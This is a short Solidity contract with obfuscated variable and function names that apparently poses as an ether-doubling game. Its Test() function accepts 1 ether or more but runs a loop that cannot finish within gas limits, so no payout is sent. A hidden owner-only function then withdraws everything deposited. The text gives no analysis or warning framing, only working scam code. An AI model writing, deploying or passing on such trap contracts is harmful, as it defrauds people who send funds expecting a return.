// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Test1
{
    address _0xdc6573 = msg.sender;

    function _0xc7f715()
    payable
    public
    {
        require(msg.sender==_0xdc6573);
        _0xdc6573.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var _0xb99429 = 1;
            var _0x378ed5 = 0;
            var _0x60dfa1 = msg.value*2;

            while(true)
            {
                if(_0xb99429<_0x378ed5)break;
                if(_0xb99429>_0x60dfa1)break;

                _0x378ed5=_0xb99429;
                _0xb99429++;
            }
            msg.sender.transfer(_0x378ed5);
        }
    }
}